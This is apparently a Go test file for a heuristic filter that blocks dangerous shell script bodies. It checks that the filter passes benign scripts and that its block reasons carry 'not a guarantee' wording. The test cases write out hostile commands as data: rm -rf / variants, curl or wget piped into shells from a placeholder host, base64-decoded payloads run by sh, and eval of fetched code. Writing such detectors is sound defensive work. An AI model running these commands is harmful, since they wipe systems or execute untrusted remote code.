package main

import (
	"strings"
	"testing"
)

func TestHeuristicSieve_FlagsDangerousPatterns(t *testing.T) {
	cases := []struct {
		name string
		body string
		hit  string
	}{
		{"rm -rf /", "rm -rf /\n", "rm-rf-root"},
		{"rm -rf / with star", "rm -rf /*\n", "rm-rf-root"},
		{"rm -fr / (flag order)", "rm -fr /\n", "rm-rf-root"},
		{"rm -Rf /", "rm -Rf /\n", "rm-rf-root"},
		{"rm -rf // (root via double slash)", "rm -rf //\n", "rm-rf-root"},
		{"rm -rf /. (root via dot)", "rm -rf /.\n", "rm-rf-root"},
		{"curl | bash", "curl https://x.example/s.sh | bash\n", "fetch-pipe-shell"},
		{"curl | sudo bash", "curl https://x.example/s.sh | sudo bash\n", "fetch-pipe-shell"},
		{"wget -O - | sh", "wget -O - https://x.example/s.sh | sh\n", "fetch-pipe-shell"},
		{"curl pipeline ending in bash", "curl https://x.example/s.sh | sed s/foo/bar/ | bash\n", "fetch-pipe-shell"},
		{"curl | fish", "curl https://x.example/s.fish | fish\n", "fetch-pipe-shell"},
		{"curl | tcsh", "curl https://x.example/s.csh | tcsh\n", "fetch-pipe-shell"},
		{"curl \\<newline> | sudo bash", "curl -fsSL https://x.example/s.sh \\\n  | sudo bash\n", "fetch-pipe-shell"},
		{"base64 -d | sh", "echo aGkK | base64 -d | sh\n", "base64-pipe-shell"},
		{"base64 --decode | bash", "base64 --decode <<<aGkK | bash\n", "base64-pipe-shell"},
		{"sudo bash -c", "sudo bash -c 'whoami'\n", "sudo-shell"},
		{"sudo sh -c", "sudo sh -c \"id\"\n", "sudo-shell"},
		{"sudo -i sh -c", "sudo -i sh -c 'id'\n", "sudo-shell"},
		{"sudo -- bash -c", "sudo -- bash -c 'id'\n", "sudo-shell"},
		{"sudo env bash -c", "sudo env bash -c 'id'\n", "sudo-shell"},
		{"eval $(curl)", "eval \"$(curl https://x.example/s.sh)\"\n", "eval-fetch"},
		{"eval backtick wget", "eval `wget -qO- https://x.example/s.sh`\n", "eval-fetch"},
	}
	for _, c := range cases {
		v := heuristicSieve{}.Evaluate([]byte(c.body), SieveMeta{})
		if !v.Block {
			t.Errorf("%s: expected block, got pass", c.name)
			continue
		}
		if !strings.Contains(v.Reason, c.hit) {
			t.Errorf("%s: reason %q did not include %q", c.name, v.Reason, c.hit)
		}
	}
	// The honest-framing language comes from one shared template, so a single
	// representative block proves it; no need to re-check every row.
	v := heuristicSieve{}.Evaluate([]byte("rm -rf /\n"), SieveMeta{})
	if !strings.Contains(v.Reason, "heuristic") || !strings.Contains(v.Reason, "not a guarantee") {
		t.Errorf("reason %q missing honest-framing language", v.Reason)
	}
}

func TestHeuristicSieve_PassesBenignBodies(t *testing.T) {
	bodies := []string{
		"", // empty body (e.g. HTTP 204) has nothing to flag
		"echo hello\n",
		"#!/usr/bin/env bash\nset -euo pipefail\necho install complete\n",
		"rm -rf /tmp/build\n",                           // root prefix, not root itself
		"rm -rf /home/user/cache\n",                     // safe deletion
		"rm -rf /.config/app\n",                         // dotfile path under root, not root itself
		"sudo apt-get install -y foo\n",                 // sudo for a package manager, no shell
		"sudo systemctl restart sshd\n",                 // sudo for systemctl
		"sudo bash ./install.sh\n",                      // sudo runs a script file, no inline -c
		"curl -fsSL https://x.example/file > out.txt\n", // download, not piped
		"echo SGVsbG8K | base64 -d > greeting.txt\n",    // base64 decode to file
		"eval \"$(brew shellenv)\"\n",                   // eval of a non-fetch command substitution
	}
	for _, b := range bodies {
		v := heuristicSieve{}.Evaluate([]byte(b), SieveMeta{})
		if v.Block {
			t.Errorf("benign body unexpectedly blocked (%s): %q", v.Reason, b)
		}
	}
}

func TestHeuristicSieve_ReportsMultipleHits(t *testing.T) {
	body := "rm -rf /\ncurl https://x.example/s.sh | bash\n"
	v := heuristicSieve{}.Evaluate([]byte(body), SieveMeta{})
	if !v.Block {
		t.Fatal("expected block")
	}
	for _, want := range []string{"rm-rf-root", "fetch-pipe-shell"} {
		if !strings.Contains(v.Reason, want) {
			t.Errorf("reason %q missing %q", v.Reason, want)
		}
	}
}
